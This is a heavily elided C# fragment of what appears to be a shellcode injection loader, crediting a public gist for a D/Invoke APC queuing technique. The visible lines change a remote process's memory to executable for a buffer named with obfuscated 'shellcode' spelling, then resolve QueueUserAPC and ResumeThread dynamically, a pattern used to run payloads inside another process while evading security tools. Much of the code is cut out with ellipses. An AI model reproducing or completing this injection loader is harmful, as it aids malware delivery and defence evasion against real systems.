...
{
    //credits to https://gist.githubusercontent.com/jfmaes/944991c40fb34625cf72fd33df1682c0/raw/68bbba6534499c4683ce868272398b3b9571be97/DInjectQueuerAPC.cs
    ...
    public class Program
    {
        ...
        public static void Main(string[] args)
        {
            ...
            virtualProtectEx(pi.hProcess, alloc, sh3Llc0d3.Length, 0x20, out oldProtect);

            pointer = KecilSaja.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
            ...
            pointer = KecilSaja.GetLibraryAddress("kernel32.dll", "ResumeThread");
